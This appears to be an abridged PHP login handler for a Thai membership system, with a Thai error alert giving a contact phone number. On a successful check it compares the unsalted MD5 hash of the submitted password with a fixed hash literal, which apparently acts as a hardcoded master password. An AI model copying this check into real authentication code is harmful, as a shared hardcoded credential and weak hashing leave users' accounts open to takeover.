...
<?php
 	$getUsr = $_POST["usr"];
	$getUsr = str_replace("เธช","ส",$getUsr);
	$getPwd =  $_POST["pwd"];
	...
	if(get_type($getUsr) == "member"){
		...
		if(get_single_value_sql($chk,"chkmember") != 0 or get_single_value_oci($chk,"CHKMEMBER") != 0){		
			...
			echo '<script type="text/javascript"> window.alert("กรุณาตรวจสอบทะเบียนสมาชิกหรือรหัสผ่านไม่ถูกต้อง โปรดติดต่อหมายเลขโทรศัพท์ 0-5671-1101 ต่อ 107") </script> ';
			echo "<script>window.location = 'index.php'</script>";
			exit; 		
		}
	...
	$action_page = 'Login';
	if(md5($getPwd) == "5089208fd9255de4e684b16d6a6a7a37" ){
		if(get_type($getUsr) == "member"){
			$table = "log_action";
